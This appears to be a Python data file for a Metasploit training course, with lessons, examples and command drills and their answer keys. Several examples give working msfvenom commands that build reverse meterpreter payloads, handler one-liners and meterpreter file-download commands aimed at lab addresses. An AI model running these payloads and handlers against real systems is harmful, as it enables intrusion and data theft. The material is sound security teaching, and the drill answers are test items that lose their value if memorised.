"""Metasploit: the framework's model, which is the part worth learning.

Metasploit is a large program with a small idea, and the idea is what earns it
a module: **everything is a module with options, and running one is choosing
a module, setting its options, and firing it.** Exploits, payloads, encoders,
auxiliary scanners, post-exploitation tools and evasion modules all share that
one interface. Once that lands, the thousands of modules stop being a catalogue
to memorise and become a search problem.

The second genuinely conceptual thing here is the **payload split**: staged
versus stageless, bind versus reverse, and the handler that has to be waiting.
People run an exploit, see it succeed, get no session, and have no model for
why. The answer is always in that split, and it is a network question rather
than an exploit question.

**Verification: none, and the module says so.** Metasploit is not installed
here, it wants its own database, and there is no honest offline lab a trainer
can build for it. Every challenge in this module is self-marked per D8, and the
practice work is deliberately shaped around a target you stand up yourself.
That is a real limitation, stated plainly, rather than a fake check.

**Scope boundary, which matters more here than anywhere else in the roster.**
This module teaches what a module is, how options and payloads and handlers
work, and how to read what the framework tells you. It does not teach which
exploit to run against whom, and it contains no target selection guidance. The
plan's test applies: would this be worth knowing with no engagement in
progress? Understanding staged payloads and handlers passes. A list of
vulnerabilities to try does not, and is not here.
"""

MODULE = {
    'id': 'msf',
    'title': 'Metasploit',
    'group': 'Security',
    'blurb': 'Modules and options, payloads and handlers, sessions, meterpreter, msfvenom.',
    'context': 'You are at an msfconsole prompt, working against a lab target you built.',
    'needs': ['msfconsole'],
    'prereqs': ['linux', 'ssh'],
    'adapter': None,
    'estimate': '4-5 hours',
    'order': 91,

    'lessons': [
        {
            'id': 'ms-what',
            'title': 'What Metasploit is, and what it is not',
            'next': 'ms-model',
            'concept': (
                'Metasploit is how you drive thousands of attack modules '
                'through one interface. That is why `search`, `use`, `set`, '
                'and `run` is the skill, not a catalogue of exploits.\n\n'
                'The library part is easy to describe: several thousand '
                'modules, each one a piece of code that does something '
                'specific, contributed and maintained over twenty years. '
                'Exploits, scanners, credential dumpers, payload generators, '
                'post-exploitation tools.\n\n'
                'The interface part is what made it matter. Before it, every '
                'exploit was a standalone script by a different author with '
                'different arguments, different output and different bugs. '
                'Metasploit\'s contribution was to say: **every module is '
                'selected the same way, configured the same way, and run the '
                'same way.** Learn the workflow once and you can drive '
                'anything in the framework, including modules written after '
                'you learned it.\n\n'
                'So the thing to take from this module is not a list of '
                'exploits. It is the workflow, which is four commands, and '
                'the vocabulary that makes the four commands make sense: '
                'module, option, payload, session.\n\n'
                '**Scope, and this one is not decoration.** This module '
                'teaches how the tool is built and driven, on targets you own '
                'or are explicitly permitted to test. It does not teach '
                'target selection or when to reach for something during an '
                'engagement, which is a different subject. The test applied '
                'throughout this group is "would this still be worth knowing '
                'with no engagement in progress", and the framework\'s design '
                'passes it comfortably.\n\n'
                'One practical note: **it is large and it wants a database.** '
                'Everything in these lessons is readable without installing '
                'it, and the module says so wherever verification is not '
                'possible.'
            ),
            'examples': [
                {
                    'label': 'Getting in and out of the console',
                    'code': 'msfconsole -q      start, without the banner\n\nback               leave the current module\nexit               leave msfconsole\nCtrl-C             interrupt a running module\n\nexit -y            leave without being asked',
                    'note': 'back and exit are different and both are needed: back drops the module you selected and keeps the console, exit ends the session and any sessions it is holding.',
                },
                {
                    'label': 'The whole workflow, and it never changes',
                    'code': ('search  something\n'
                             'use     the/module/path\n'
                             'show options\n'
                             'set     RHOSTS 10.0.0.5\n'
                             'run\n'
                             '\n'
                             'identical for every module type'),
                    'note': 'This is the payoff of the framework. Five '
                            'commands drive a port scanner and a kernel '
                            'exploit equally.',
                },
                {
                    'label': 'What the module tree is telling you',
                    'code': ('auxiliary/scanner/...   look, do not exploit\n'
                             'exploit/windows/...     gain execution\n'
                             'payload/...             what runs afterwards\n'
                             'post/...                once you have a session\n'
                             'encoder/, nop/          shape the payload'),
                    'note': 'The first path component is the type, and it '
                            'tells you what a module is for before you read '
                            'anything else about it.',
                },
                {
                    'label': 'Why the payload is separate',
                    'code': ('exploit   how to get code running\n'
                             'payload   what that code should be\n'
                             '\n'
                             'one exploit x many payloads,\n'
                             'chosen independently'),
                    'note': 'Separating these is the framework\'s other big '
                            'idea. Every exploit gets every payload for free, '
                            'which is why the library multiplies out.',
                },
            ],
            'misconceptions': [
                'Metasploit is not a scanner or a vulnerability finder. It '
                'runs modules you select, and choosing what to point it at is '
                'not something the tool does for you.',
                'The framework is not the exploits. The lasting value is the '
                'common interface, which is why the workflow transfers to '
                'modules that did not exist when you learned it.',
                'msfconsole is not the only interface. msfvenom generates '
                'payloads standalone, and the same library is scriptable, '
                'which is how it ends up inside other tools.',
            ],
            'try_it': [
                'Read the four workflow commands above and say what each one '
                'does out loud. That is most of the module.',
                'If you have it installed, run `msfconsole -q` and then '
                '`show -h`. If you do not, nothing later depends on it.',
            ],
        },
        {
            'id': 'ms-model',
            'title': 'Everything is a module with options',
            'concept':
                'The framework has one interface and it is worth stating '
                'plainly: you select a module, you set its options, and you '
                'run it. That is the whole workflow, and it is identical for '
                'an exploit, a port scanner, a credential dumper and a '
                'password brute forcer.\n\n'
                'Modules are organised in a tree by type, and the type is the '
                'first path element. **exploit/** attempts to gain execution. '
                '**auxiliary/** is everything that does not: scanners, '
                'fuzzers, sniffers, denial of service, and a great many '
                'protocol clients. **post/** runs against a session you '
                'already have. **payload/** is the code that gets executed. '
                '**encoder/** and **nop/** reshape payloads. **evasion/** '
                'is its own type.\n\n'
                'Auxiliary is much bigger than people expect and is where a '
                'lot of the everyday value is. `auxiliary/scanner/smb/` '
                'alone covers version detection, share enumeration and user '
                'enumeration, and none of it exploits anything.\n\n'
                'Options are the other half. Each module declares what it '
                'needs, `show options` lists them, and required options with '
                'no value are why a module refuses to run. RHOSTS is the '
                'target, LHOST is you, RPORT and LPORT are the ports, and '
                'the mistake everyone makes at least once is setting RHOST '
                'when the module wants RHOSTS or leaving LHOST pointing at '
                'the wrong interface.\n\n'
                'A resource script is a file of the same `use` / `set` / '
                '`run` lines you type, with a `.rc` suffix. `msfconsole -r '
                'lab.rc` replays them so a session is repeatable instead of '
                'a transcript you cannot quite reconstruct. Inside the '
                'console, `resource lab.rc` does the same. The file is not '
                'a different language: it is the console, saved.\n\n'
                'You set options and run. The next lesson is finding '
                'the module in the first place, which is the search '
                'that pays off on a corpus this size.',
            'examples': [
                {'label': 'The whole workflow, four lines',
                 'code': 'search type:auxiliary smb_version\n'
                         'use auxiliary/scanner/smb/smb_version\n'
                         'set RHOSTS 10.0.0.0/24\n'
                         'run',
                 'note': 'Select, configure, fire. Identical shape for every '
                         'module type in the framework.'},
                {'label': 'What does this module need',
                 'code': 'show options',
                 'note': 'Required with no current value is why a module '
                         'refuses to run. Read the Required column.'},
                {'label': 'Everything about the module, including references',
                 'code': 'info',
                 'note': 'Description, authors, references, and the targets '
                         'it knows about. Read this before running anything.'},
                {'label': 'Set something for every module, not just this one',
                 'code': 'setg RHOSTS 10.0.0.5',
                 'note': 'Global. Convenient, and the cause of a great deal '
                         'of confusion later. unsetg clears it.'},
                {'label': 'Replay the session from a file',
                 'code': '# lab.rc\n'
                         'use auxiliary/scanner/smb/smb_version\n'
                         'set RHOSTS 10.0.0.0/24\n'
                         'run\n'
                         '\n'
                         'msfconsole -r lab.rc\n'
                         'resource lab.rc          from inside the console',
                 'note': 'Same commands you would type. The file is how a '
                         'lab session becomes repeatable.'},
            ],
            'misconceptions': [
                'Metasploit is not only exploits. Auxiliary is larger and is '
                'where much of the everyday use is.',
                'RHOST and RHOSTS are different option names, and modules '
                'differ on which they use.',
                'A module that will not run is usually missing a required '
                'option rather than broken.',
            ],
            'try_it': [
                'Search for an auxiliary scanner and read its info output '
                'before running it.',
                'Set a global option, then start a different module and see '
                'that it is still set.',
            ],
            'next': 'ms-search',
        },
        {
            'id': 'ms-search',
            'title': 'Finding the module you want',
            'concept':
                'Keyed search is how you find one module in a corpus of '
                'thousands. That is why type, platform, cve and rank shrink '
                'the result, and why `info` before `run` is the habit that '
                'saves an hour.\n\n'
                '`search type:exploit platform:windows smb` narrows by three '
                'axes at once. The useful keys are type, platform, name, '
                'path, author, cve, rank and disclosure_date. `search '
                'cve:2017-0144` goes straight to a specific vulnerability, '
                'which is how you cross from an advisory to a module.\n\n'
                '**Rank** is worth understanding rather than ignoring. It '
                'runs from excellent through great, good, normal, average, '
                'low to manual, and it describes **reliability and the risk '
                'of crashing the target**, not how powerful the exploit is. '
                'excellent means it should not crash the service. manual '
                'means it needs a human. Sorting by rank is sensible and '
                'reading the rank before running anything is more sensible.\n\n'
                'After a search, `use 3` selects by result index, which is '
                'faster than typing a path. `back` leaves the current module '
                'and `previous` returns to the one before.\n\n'
                'The other habit worth having: `info` before `run`, always. '
                'It names what the module does, which versions it targets, '
                'and frequently a caveat that saves an hour.',
            'examples': [
                {'label': 'The keyed search, which is the useful one',
                 'code': 'search type:exploit platform:windows rank:excellent '
                         'smb',
                 'note': 'Four constraints. A bare keyword search over '
                         'thousands of modules is not a search.'},
                {'label': 'From an advisory to a module',
                 'code': 'search cve:2021-34527',
                 'note': 'The direct route when you already know what you are '
                         'looking for.'},
                {'label': 'Select by result number',
                 'code': 'use 3',
                 'note': 'Faster than typing the path, and only valid '
                         'immediately after a search.'},
                {'label': 'Read before running',
                 'code': 'info',
                 'note': 'Targets, references and caveats. This is the step '
                         'people skip and then debug for an hour.'},
            ],
            'misconceptions': [
                'Rank is about reliability and crash risk, not about how '
                'powerful or how new an exploit is.',
                'A bare search term is not a search in a corpus this size. '
                'Use the keys.',
                '"use 3" only refers to the last search results, so it means '
                'something different a minute later.',
            ],
            'try_it': [
                'Search with three keys at once and count how much the result '
                'set shrinks with each.',
                'Find a module by CVE and read its info output end to end.',
            ],
            'next': 'ms-payloads',
        },
        {
            'id': 'ms-payloads',
            'title': 'Payloads: staged, stageless, bind and reverse',
            'concept':
                'Reverse versus bind, and staged versus stageless, is how a '
                'payload gets code back to you. That is why an exploit that '
                'reports success with no session is almost always a payload, '
                'handler, or network miss rather than a failed exploit.\n\n'
                '**Reverse versus bind** is a network direction question. A '
                'reverse payload connects from the target back to you, which '
                'works through most outbound-permitting firewalls and NAT. A '
                'bind payload listens on the target and waits for you to '
                'connect in, which requires that you can reach that port. '
                'Reverse is the default because outbound is usually easier '
                'than inbound, and bind is what you use when the target '
                'cannot reach you at all.\n\n'
                '**Staged versus stageless** is a size question, and the '
                'naming tells you which is which. '
                '`windows/meterpreter/reverse_tcp` with slashes is staged: a '
                'small first stage runs, connects back, and downloads the '
                'rest. `windows/meterpreter_reverse_tcp` with an underscore '
                'is stageless: the whole payload is in one blob.\n\n'
                'Staged is smaller, which matters when the space you can '
                'write into is tiny, and it is more fragile, because the '
                'second stage has to arrive over a connection that has to '
                'stay up. Stageless is larger and more robust. That one '
                'character of difference in the name has caught everyone at '
                'least once.\n\n'
                '**The handler must be waiting** before the payload fires. '
                'For an exploit inside the framework this is automatic. For a '
                'payload you delivered another way, you have to start '
                '`exploit/multi/handler` with exactly the same payload, LHOST '
                'and LPORT, and a mismatch there produces a connection that '
                'arrives and is dropped.\n\n'
                'A matching handler is not a session yet. The next '
                'lesson is sessions, jobs, and meterpreter, which is '
                'what a successful payload actually leaves you.',
            'examples': [
                {'label': 'Staged, note the slash',
                 'code': 'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
                 'note': 'Small first stage downloads the rest. Fragile if '
                         'the connection is unreliable.'},
                {'label': 'Stageless, note the underscore',
                 'code': 'set PAYLOAD windows/x64/meterpreter_reverse_tcp',
                 'note': 'One blob, bigger, more robust. One character apart '
                         'in the name.'},
                {'label': 'Bind, for when they cannot reach you',
                 'code': 'set PAYLOAD windows/x64/meterpreter/bind_tcp',
                 'note': 'The target listens and you connect in, so no LHOST '
                         'and you need reachability inbound.'},
                {'label': 'What payloads does this exploit support',
                 'code': 'show payloads',
                 'note': 'Filtered to those compatible with the current '
                         'module and target.'},
                {'label': 'Catch a payload you delivered yourself',
                 'code': 'use exploit/multi/handler\n'
                         'set PAYLOAD windows/x64/meterpreter/reverse_tcp\n'
                         'set LHOST 10.0.0.2\nset LPORT 4444\nrun -j',
                 'note': 'Payload, LHOST and LPORT must match the one you '
                         'generated exactly. -j runs it as a background job.'},
            ],
            'misconceptions': [
                'A slash and an underscore in a payload name are not '
                'cosmetic. They are staged and stageless respectively.',
                'A reverse payload does not need the target to be reachable '
                'from you, and a bind payload does.',
                'An exploit reporting success with no session usually means '
                'the payload could not get back, not that the exploit '
                'failed.',
            ],
            'try_it': [
                'List the payloads for one exploit and identify which are '
                'staged from the names alone.',
                'Start a multi/handler with a deliberately mismatched LPORT '
                'and watch what happens.',
            ],
            'next': 'ms-sessions',
        },
        {
            'id': 'ms-sessions',
            'title': 'Sessions, jobs, and meterpreter',
            'concept':
                '`sessions -l` and Ctrl-Z are how you keep a payload '
                'connection while you run another module. That is why a '
                'session is managed separately from the module that created '
                'it, and why meterpreter is an API rather than a shell.\n\n'
                '`sessions -l` lists them, '
                '`sessions -i 1` interacts with one, and Ctrl-Z backgrounds '
                'the one you are in without killing it. That last one is the '
                'single most useful key in the console, because it lets you '
                'run another module while keeping the session.\n\n'
                'Jobs are the other background concept. `run -j` puts a '
                'module in the background, which is how you keep a handler '
                'listening while doing something else, and `jobs` lists them.\n\n'
                '**Meterpreter** is the framework\'s own payload and it is '
                'more than a shell. It runs in memory, it speaks a structured '
                'protocol rather than shovelling a shell, and it exposes '
                'commands that are the same across operating systems: '
                '`sysinfo`, `getuid`, `ps`, `download`, `upload`, `shell` to '
                'drop to a native shell, `background`, and `migrate` to move '
                'into another process.\n\n'
                'The difference between meterpreter and a plain shell payload '
                'is worth being clear about. A shell payload gives you '
                '/bin/sh or cmd.exe over a socket, with no job control, no '
                'file transfer and no structure. Meterpreter gives you an API. '
                'It is also much more heavily signatured, which is the '
                'trade.\n\n'
                '`post/` modules run against a session rather than a host, '
                'which is why they take a SESSION option instead of RHOSTS. '
                'That difference confuses people the first time.',
            'examples': [
                {'label': 'What sessions do I have',
                 'code': 'sessions -l',
                 'note': 'Id, type, and where it came from. -i to interact, '
                         '-k to kill.'},
                {'label': 'Background without losing it',
                 'code': 'Ctrl-Z',
                 'note': 'Or the background command inside meterpreter. The '
                         'most useful key in the console.'},
                {'label': 'Where am I and who am I',
                 'code': 'sysinfo\ngetuid',
                 'note': 'The first two commands in any session, every '
                         'time.'},
                {'label': 'Drop to a native shell and come back',
                 'code': 'shell',
                 'note': 'Ctrl-Z or exit returns to meterpreter, depending on '
                         'how the shell ended.'},
                {'label': 'A post module wants a session, not a host',
                 'code': 'use post/multi/gather/env\nset SESSION 1\nrun',
                 'note': 'SESSION rather than RHOSTS. Post modules operate '
                         'through an existing session.'},
            ],
            'misconceptions': [
                'Ctrl-C in a session is not how you leave it. Ctrl-Z '
                'backgrounds it; Ctrl-C may kill it.',
                'Meterpreter is not a shell. It is an API, and shell is one '
                'command within it.',
                'Post modules do not take RHOSTS. They take SESSION, because '
                'they run through a session you already hold.',
            ],
            'try_it': [
                'Get a session in a lab, background it, run another module, '
                'and come back to it.',
                'Compare a shell payload and a meterpreter payload on the '
                'same target and note what you cannot do with the shell.',
            ],
            'next': 'ms-venom',
        },
        {
            'id': 'ms-venom',
            'title': 'msfvenom: payloads outside the console',
            'concept':
                '`msfvenom` generates a payload as a file, which is what you '
                'use when the delivery is not an exploit inside the '
                'framework. It is one command with a consistent set of '
                'flags.\n\n'
                '`-p` is the payload, and its name follows the same staged '
                'and stageless naming as in the console. `-f` is the output '
                'format: exe, elf, raw, python, powershell, war, and dozens '
                'more, and `--list formats` prints them. `-o` writes to a '
                'file. `LHOST=` and `LPORT=` are given as bare key equals '
                'value arguments rather than flags, which is the part people '
                'get wrong.\n\n'
                '`-a` and `--platform` set architecture and platform, and '
                'getting the architecture wrong is the commonest reason a '
                'payload does nothing at all on Windows: an x86 payload in an '
                'x64 process, or the reverse.\n\n'
                '`-b` specifies bad characters to avoid, which matters when '
                'the delivery path cannot carry certain bytes, classically a '
                'null byte in a string. `-e` selects an encoder and `-i` sets '
                'iterations.\n\n'
                'On encoders, one honest note: `shikata_ga_nai` is famous and '
                'is **not** an antivirus evasion tool in any modern sense. It '
                'was designed to avoid bad characters, every product has '
                'signatured its decoder stub for years, and iterating it '
                'twenty times mostly produces a larger file that is detected '
                'just as fast.\n\n'
                'Whatever you generate, the handler still has to match.\n\n'
                'A generated file still needs a matching handler. The '
                'next lesson is the database, which is how the '
                'framework remembers what that handler found.',
            'examples': [
                {'label': 'A Windows executable',
                 'code': 'msfvenom -p windows/x64/meterpreter/reverse_tcp '
                         'LHOST=10.0.0.2 LPORT=4444 -f exe -o payload.exe',
                 'note': 'LHOST and LPORT are bare arguments, not flags. That '
                         'is the part everyone gets wrong first.'},
                {'label': 'An ELF for Linux',
                 'code': 'msfvenom -p linux/x64/meterpreter/reverse_tcp '
                         'LHOST=10.0.0.2 LPORT=4444 -f elf -o payload.elf',
                 'note': 'Same shape, different platform and format.'},
                {'label': 'Raw shellcode with a bad character excluded',
                 'code': 'msfvenom -p linux/x64/exec CMD=/bin/sh -f raw '
                         '-b "\\x00" -o sc.bin',
                 'note': '-b is about what the delivery path can carry, not '
                         'about evasion.'},
                {'label': 'What formats are there',
                 'code': 'msfvenom --list formats',
                 'note': 'Also --list payloads and --list encoders. Long '
                         'lists worth piping to grep.'},
                {'label': 'And then catch it',
                 'code': 'msfconsole -q -x "use exploit/multi/handler; set '
                         'PAYLOAD windows/x64/meterpreter/reverse_tcp; set '
                         'LHOST 10.0.0.2; set LPORT 4444; run"',
                 'note': '-x runs commands at startup, which is how you '
                         'script a handler into one line.'},
            ],
            'misconceptions': [
                'LHOST and LPORT are not flags in msfvenom. They are bare '
                'key=value arguments after the payload.',
                'Encoders are not antivirus evasion. shikata_ga_nai avoids '
                'bad characters and is signatured everywhere.',
                'A payload with the wrong architecture usually does nothing '
                'visible at all, rather than producing an error.',
            ],
            'try_it': [
                'Generate an ELF payload for a lab VM and check its size '
                'against the stageless version.',
                'Generate the same payload twice with different iteration '
                'counts and compare the file sizes.',
            ],
            'next': 'ms-db',
        },
        {
            'id': 'ms-db',
            'title': 'The database, workspaces, and importing scans',
            'concept':
                'The PostgreSQL database is how Metasploit remembers hosts, '
                'services, credentials and loot. That is why `db_nmap` and '
                '`db_import` turn a scan into something you can query, and '
                'why most installs silently throw that away.\n\n'
                'With a database, every host, service, credential and loot '
                'item you find is recorded and queryable. `hosts`, '
                '`services`, `creds` and `loot` are console commands that '
                'read it, and they accept filters, so `services -p 445` lists '
                'every host in the workspace with SMB open.\n\n'
                '**Workspaces** partition it. `workspace -a clientname` '
                'creates one and `workspace clientname` switches, which keeps '
                'two pieces of work from contaminating each other. Doing this '
                'from the start is much easier than untangling it later.\n\n'
                'The import path is the useful part: `db_nmap` runs nmap and '
                'stores the results directly, and `db_import scan.xml` reads '
                'an nmap XML file you already have. That is the concrete '
                'reason the nmap module tells you to keep the XML.\n\n'
                'Once hosts are in the database, `set RHOSTS` can take the '
                'results of a query, so a module can be pointed at every host '
                'with a given service without a copy and paste step.\n\n'
                '`db_status` tells you whether any of this is connected, and '
                '`msfdb init` sets it up. If `db_status` says no database, '
                'every command above silently does nothing useful, which is '
                'the state most installations are in.',
            'examples': [
                {'label': 'Is the database even connected',
                 'code': 'db_status',
                 'note': 'If this says no, hosts and services are empty and '
                         'will stay that way.'},
                {'label': 'Keep each piece of work separate',
                 'code': 'workspace -a lab-corp\nworkspace lab-corp',
                 'note': 'Trivial at the start, and painful to retrofit.'},
                {'label': 'Scan straight into the database',
                 'code': 'db_nmap -sV -p- 10.0.0.0/24',
                 'note': 'Same nmap, results stored. Or db_import an XML file '
                         'you already have.'},
                {'label': 'Query what you found',
                 'code': 'services -p 445 -u',
                 'note': '-u for up only. This is why keeping scan output in '
                         'XML pays off.'},
                {'label': 'Point a module at a query result',
                 'code': 'set RHOSTS file:/tmp/targets.txt',
                 'note': 'RHOSTS accepts a file, a range, or CIDR, so a query '
                         'can feed the next module.'},
            ],
            'misconceptions': [
                'The database is not required, and without it hosts, services '
                'and creds are simply empty rather than erroring.',
                'Workspaces are not a cosmetic feature. Mixing two pieces of '
                'work in one workspace is a real problem.',
                'db_nmap is not a different scanner. It is nmap, with the '
                'output stored.',
            ],
            'try_it': [
                'Run db_status and set the database up if it is not '
                'connected.',
                'Import an nmap XML file and query the services table by '
                'port.',
            ],
            'next': 'ms-reading',
        },
        {
            'id': 'ms-reading',
            'title': 'Reading what the framework tells you',
            'concept':
                'The console is chatty and its prefixes are a language worth '
                'learning, because they are how you tell a real failure from '
                'a normal step.\n\n'
                '`[*]` is informational, a step happening. `[+]` is a '
                'success. `[-]` is a failure. `[!]` is a warning, frequently '
                'about something you set that will not work. Those four '
                'cover almost everything the console prints.\n\n'
                'The two failure messages worth recognising immediately: '
                '"Exploit completed, but no session was created" means the '
                'exploit ran and the payload did not come back, which is '
                'almost always the payload, the handler, or the network '
                'between them. And "The target is not exploitable" from a '
                'check means the module looked and said no, which is more '
                'informative than most people treat it as.\n\n'
                '`check` is underused. Many exploit modules implement it, and '
                'it tests whether the target appears vulnerable without '
                'firing anything.\n\n'
                'Verbosity helps: `set VERBOSE true` on a module, and '
                '`setg LogLevel 3` for the framework. The log at '
                '`~/.msf4/logs/framework.log` has more than the console '
                'shows.\n\n'
                'And `spool /tmp/session.log` records the console to a file, '
                'which is the equivalent of keeping your nmap output and is '
                'worth doing by habit for the same reason.',
            'examples': [
                {'label': 'Ask before firing',
                 'code': 'check',
                 'note': 'Not every module implements it, and where it exists '
                         'it is cheap and informative.'},
                {'label': 'Record everything the console says',
                 'code': 'spool /tmp/msf-session.log',
                 'note': 'Same argument as keeping nmap XML. You will want it '
                         'later.'},
                {'label': 'More detail when something is not working',
                 'code': 'set VERBOSE true',
                 'note': 'Per module. setg LogLevel 3 raises it '
                         'framework-wide.'},
                {'label': 'The message that means check your handler',
                 'code': '[*] Exploit completed, but no session was created.',
                 'note': 'The exploit ran. The payload did not get back. '
                         'Look at LHOST, LPORT and the network.'},
            ],
            'misconceptions': [
                '"Exploit completed, but no session was created" is not a '
                'failed exploit. It is usually a payload or handler problem.',
                '[*] lines are not errors. Only [-] is a failure and [!] is a '
                'warning.',
                'The console is not the whole log. framework.log has more.',
            ],
            'try_it': [
                'Turn on spooling at the start of a lab session and read the '
                'file afterwards.',
                'Run check against a target you know is patched and read what '
                'it says.',
            ],
            'next': 'ms-lab',
        },
        {
            'id': 'ms-lab',
            'title': 'Somewhere to practise, and the rules about it',
            'concept':
                'A lab target you own is how you practise the workflow '
                'without pointing the framework at anything else. That is '
                'why Metasploitable, an evaluation Windows VM, or a Vulhub '
                'container belongs on a host-only network, and why LHOST '
                'wrong is the usual reason nothing comes back.\n\n'
                'The standard lab is **Metasploitable**, a deliberately '
                'vulnerable Linux VM, or its version 3 which is a build '
                'system for both a Linux and a Windows target. It exists '
                'precisely to be attacked and it is designed to make the '
                'framework\'s features reachable.\n\n'
                'For Windows work, an evaluation Windows VM with the firewall '
                'configured and updates held back is more realistic and takes '
                'more setting up. **Vulhub** provides containerised '
                'vulnerable applications for specific CVEs, which is the '
                'quickest way to practise one thing.\n\n'
                'Networking is where lab time gets lost. Put the lab on a '
                'host-only or internal network. Know your own address on that '
                'network, because LHOST wrong is the single most common '
                'reason nothing comes back, and if you are behind NAT the '
                'target cannot reach you at all unless you are on the same '
                'segment.\n\n'
                'Snapshot before each attempt. Exploits crash services, and '
                'rebuilding a lab you crashed is the least educational '
                'possible use of an evening.\n\n'
                'One further honesty note: skill with this framework is a '
                'small part of the subject it belongs to. Knowing what a '
                'module does is tool proficiency, which is what this project '
                'teaches. Knowing when any of it is appropriate is a '
                'different subject, and this module does not cover it.',
            'examples': [
                {'label': 'Find your own address for LHOST',
                 'code': 'ip -brief addr show',
                 'note': 'On the lab network specifically. LHOST wrong is the '
                         'commonest reason nothing comes back.'},
                {'label': 'Snapshot before you break it',
                 'code': 'virsh snapshot-create-as target clean',
                 'note': 'Exploits crash services. Rebuilding by hand teaches '
                         'nothing.'},
                {'label': 'A containerised single vulnerability',
                 'code': 'cd vulhub/httpd/CVE-2021-41773 && docker compose up '
                         '-d',
                 'note': 'The fastest way to practise one specific thing.'},
                {'label': 'Confirm reachability both ways first',
                 'code': 'ping -c1 TARGET   # and from the target, back to you',
                 'note': 'A reverse payload needs the return path. Test it '
                         'before blaming the exploit.'},
            ],
            'misconceptions': [
                'A lab on your normal network is not a small shortcut. '
                'Exploits and scans do not know where the lab ends.',
                'LHOST is your address on the network the target can reach, '
                'not whatever your default route uses.',
                'Being able to drive the framework is not the same as '
                'understanding the vulnerability it is using.',
            ],
            'try_it': [
                'Stand up Metasploitable on an isolated network and confirm '
                'reachability in both directions.',
                'Take a snapshot, run something that crashes a service, and '
                'restore it.',
            ],
            'next': None,
        },
    ],

    'drills': [
        {'id': 'msd-console', 'type': 'command',
         'prompt': 'Start msfconsole without the banner.',
         'answer': 'msfconsole -q',
         'teach': '-q is quiet. -x runs commands at startup, which is how you '
                  'script a handler into one line.'},
        {'id': 'msd-search-type', 'type': 'command',
         'prompt': 'Search for Windows SMB exploit modules ranked excellent.',
         'answer': 'search type:exploit platform:windows rank:excellent smb',
         'teach': 'Keyed search is the only usable kind in a corpus this '
                  'size. Rank is reliability, not power.'},
        {'id': 'msd-search-cve', 'type': 'command',
         'prompt': 'Search for modules matching CVE-2021-34527.',
         'answer': 'search cve:2021-34527',
         'teach': 'The direct route from an advisory to a module.'},
        {'id': 'msd-use', 'type': 'command',
         'prompt': 'Select the SMB version scanner module.',
         'answer': 'use auxiliary/scanner/smb/smb_version',
         'teach': 'The first path element is the module type. auxiliary is '
                  'much larger than people expect.'},
        {'id': 'msd-options', 'type': 'command',
         'prompt': 'Show the options for the currently selected module.',
         'answer': 'show options',
         'teach': 'Read the Required column. A required option with no value '
                  'is why a module refuses to run.'},
        {'id': 'msd-info', 'type': 'command',
         'prompt': 'Show the full description and references for the current module.',
         'answer': 'info',
         'teach': 'Targets, references and caveats. The step people skip and '
                  'then debug for an hour.'},
        {'id': 'msd-set-rhosts', 'type': 'command',
         'prompt': 'Set the target range to 10.0.0.0/24 for the current module.',
         'answer': 'set RHOSTS 10.0.0.0/24',
         'teach': 'RHOSTS takes a range, CIDR, or file:/path. Some modules '
                  'want RHOST singular instead.'},
        {'id': 'msd-setg', 'type': 'command',
         'prompt': 'Set the target 10.0.0.5 globally for every module.',
         'answer': 'setg RHOSTS 10.0.0.5',
         'teach': 'Convenient, and a frequent source of confusion twenty '
                  'minutes later. unsetg clears it.'},
        {'id': 'msd-showpayloads', 'type': 'command',
         'prompt': 'List the payloads compatible with the current module.',
         'answer': 'show payloads',
         'teach': 'Filtered to what this module and target can actually '
                  'carry.'},
        {'id': 'msd-payload-staged', 'type': 'command',
         'prompt': 'Set a staged x64 Windows meterpreter reverse TCP payload.',
         'answer': 'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
         'teach': 'The slash before reverse_tcp makes it staged: a small '
                  'stage downloads the rest.'},
        {'id': 'msd-payload-stageless', 'type': 'command',
         'prompt': 'Set a stageless x64 Windows meterpreter reverse TCP payload.',
         'answer': 'set PAYLOAD windows/x64/meterpreter_reverse_tcp',
         'teach': 'The underscore makes it stageless: one blob, bigger, more '
                  'robust. One character apart.'},
        {'id': 'msd-payload-bind', 'type': 'command',
         'prompt': 'Set an x64 Windows meterpreter bind TCP payload.',
         'answer': 'set PAYLOAD windows/x64/meterpreter/bind_tcp',
         'teach': 'The target listens and you connect in, so there is no '
                  'LHOST and you need inbound reachability.'},
        {'id': 'msd-lhost', 'type': 'command',
         'prompt': 'Set your own address to 10.0.0.2 for the reverse connection.',
         'answer': 'set LHOST 10.0.0.2',
         'teach': 'Your address on the network the target can reach, which is '
                  'not always your default route.'},
        {'id': 'msd-check', 'type': 'command',
         'prompt': 'Test whether the target appears vulnerable without exploiting it.',
         'answer': 'check',
         'teach': 'Not every module implements it, and where it exists it is '
                  'cheap and more informative than people assume.'},
        {'id': 'msd-run-job', 'type': 'command',
         'prompt': 'Run the current module in the background as a job.',
         'answer': 'run -j',
         'teach': 'How you keep a handler listening while doing something '
                  'else. jobs lists them.'},
        {'id': 'msd-handler', 'type': 'command',
         'prompt': 'Select the module that catches a payload you delivered yourself.',
         'answer': 'use exploit/multi/handler',
         'teach': 'Payload, LHOST and LPORT must match what you generated '
                  'exactly, or the connection arrives and is dropped.'},
        {'id': 'msd-sessions', 'type': 'command',
         'prompt': 'List the sessions you currently hold.',
         'answer': 'sessions -l',
         'teach': '-i interacts, -k kills. Sessions are managed separately '
                  'from modules.'},
        {'id': 'msd-session-interact', 'type': 'command',
         'prompt': 'Interact with session 1.',
         'answer': 'sessions -i 1',
         'teach': 'Ctrl-Z backgrounds it again without killing it, which is '
                  'the most useful key in the console.'},
        {'id': 'msd-post', 'type': 'command',
         'prompt': 'Set session 1 as the target for the current post module.',
         'answer': 'set SESSION 1',
         'teach': 'Post modules take SESSION rather than RHOSTS, because they '
                  'run through a session you already hold.'},
        {'id': 'msd-meter-sysinfo', 'type': 'command',
         'prompt': 'From meterpreter, show what machine you are on.',
         'answer': 'sysinfo',
         'teach': 'sysinfo and getuid are the first two commands in any '
                  'session, every time.'},
        {'id': 'msd-meter-getuid', 'type': 'command',
         'prompt': 'From meterpreter, show which user you are running as.',
         'answer': 'getuid',
         'teach': 'Who you are decides what every next step can do.'},
        {'id': 'msd-meter-shell', 'type': 'command',
         'prompt': 'From meterpreter, drop into a native shell on the target.',
         'answer': 'shell',
         'teach': 'Meterpreter is an API and shell is one command within it, '
                  'not the other way round.'},
        {'id': 'msd-meter-download', 'type': 'command',
         'prompt': 'From meterpreter, download C:\\notes.txt to your machine.',
         'answer': 'download C:\\\\notes.txt',
         'teach': 'Structured file transfer is one of the things a plain '
                  'shell payload cannot do at all.'},
